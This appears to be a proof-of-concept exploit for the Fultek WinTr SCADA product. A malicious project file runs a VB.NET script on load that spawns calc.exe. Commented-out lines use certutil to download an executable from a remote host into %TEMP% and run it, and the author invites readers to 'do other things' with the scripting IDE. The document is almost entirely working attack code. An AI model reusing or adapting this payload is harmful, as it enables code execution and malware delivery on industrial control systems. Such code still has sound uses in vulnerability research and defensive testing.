https://www.fultek.com.tr/en/scada/

mc_wintr_poc.spr project spawns 'calc.exe' when opened. use the
scripting ide to do other things.




Imports System
Imports System.IO
Imports System.Windows.Forms
Imports Microsoft.VisualBasic

Namespace WinTr
Public Class MainClass
	Public Sub Load
	'------- Script Start Line -------

Dim objShell
'Dim wait

objShell = CreateObject("WScript.shell")
'objshell.exec("certutil.exe -urlcache -split -f http://192.168.1.1:8000/mc.exe %TEMP%\\mc.exe")	 

'wait = DateAdd("s", 10, Now())
'Do Until(Now() > wait)
'Loop

'objshell.exec("%TEMP%\\mc.exe")	 	 
objshell.exec("calc.exe")

	'------- Script End Line -------
	End Sub
End Class
End Namespace
